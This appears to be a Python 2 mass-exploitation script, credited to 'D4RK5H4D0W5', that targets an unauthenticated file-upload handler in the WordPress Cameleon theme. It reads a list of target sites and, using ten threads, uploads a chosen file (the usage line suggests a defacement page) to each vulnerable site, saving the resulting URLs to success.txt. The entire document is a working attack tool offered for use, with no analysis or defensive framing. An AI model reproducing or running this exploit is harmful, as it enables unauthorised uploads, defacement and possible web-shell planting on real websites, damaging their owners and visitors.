#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
#Author D4RK5H4D0W5
G0 = '\033[0;32m'
C1 = '\033[1;36m'
W0 = '\033[0;37m'
R0 = '\033[0;31m'
import requests,sys,os,datetime
from multiprocessing.pool import ThreadPool
r=requests.Session()
#now = datetime.datetime.now()
def hek(site):
	try:
		cek=r.get(site+'/wp-content/themes/cameleon/includes/fileuploader/upload_handler.php').text
		if 'error' in cek:
			exp=r.post(site+'/wp-content/themes/cameleon/includes/fileuploader/upload_handler.php',files={'qqfile':(sys.argv[1],open(sys.argv[2]).read(),'text/html')}).json
			if exp['success'] == True:
				print '%s[ %ssuccess %s] %s'%(W0,G0,W0,exp['url'])
				open('success.txt','a+').write(exp['url']+'\n')
			else:
				print '%s[ %sfailed %s] %s'%(W0,R0,W0,site)
		else:
			print '%s[ %snot vuln %s] %s'%(W0,R0,W0,site)
	except:
		print '%s[ %sunk error %s] %s'%(W0,R0,W0,site)
		pass
try:
	os.system('clear')
	print '''%s
  _      _____
 | | /| / / _ \   %sCoded by D4RKSH4D0WS%s
 | |/ |/ / ___/   %sig @anonroz_team%s
 |__/|__/_/       %sContent Chameleon
	'''%(C1,W0,C1,W0,C1,W0)
	ThreadPool(10).map(hek,open(sys.argv[3]).read().splitlines())
	print '\n%s[ %sdone %s] success saved in success.txt'%(W0,G0,W0)
except requests.exceptions.ConnectionError:
	exit('%s[%s!%s] Check internet'%(W0,R0,W0))
except IndexError:
	exit('%s[%s!%s] python2 %s your-nick sc.html target.txt \n%s[%s!%s] Use http or https on the target web'%(W0,R0,W0,sys.argv[0],W0,R0,W0))
except IOError:
	exit('%s[%s!%s] File does not exist'%(W0,R0,W0))
except KeyboardInterrupt:
	exit('\n%s[%s!%s] Exit'%(W0,R0,W0))
